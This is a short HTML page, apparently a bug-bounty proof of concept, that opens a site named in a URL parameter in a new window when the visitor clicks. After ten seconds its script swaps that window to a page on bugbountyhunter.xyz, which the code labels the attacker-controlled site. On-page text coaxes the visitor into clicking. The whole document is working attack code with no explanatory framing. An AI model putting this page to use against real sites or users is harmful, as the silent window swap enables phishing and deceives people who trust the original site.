<!DOCTYPE html>
<html>
<head>
    <style>
        body {
            background-color: white;
            width: 100%;
            height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
            font-family: Arial, sans-serif;
        }
        #message {
            color: black;
            font-size: 20px;
        }
    </style>
    <script>
        function xxxURLParam(xTargetParam) {
            const xFormURL = window.location.search.substring(1);
            const xURLVars = xFormURL.split('&');
            for (let i = 0; i < xURLVars.length; i++) {
                const xParam = xURLVars[i].split('=');
                if (xParam[0] === xTargetParam) {
                    return xParam[1];
                }
            }
            return "cbbh.png";
        }

        function init() {
            console.log("Redirecting to attacker's controlled site");       
            foo.location.href = "https://bugbountyhunter.xyz/poc.html";
        }

        function launch() {
            const target = xxxURLParam("target");
            foo = window.open(target, "foo", "");
            console.log("Target site opened successfully");
            setTimeout(init, 10000);
        }

        function setup() {
            const target = xxxURLParam("target");
            document.body.addEventListener('click', launch);
            const message = document.createElement('div');
            message.id = 'message';
            message.innerText = `If the site did not automatically redirect to ${target}, click anywhere in the white background`;
            document.body.appendChild(message);
        }

        window.onload = setup;
    </script>
</head>
<body></body>
</html>
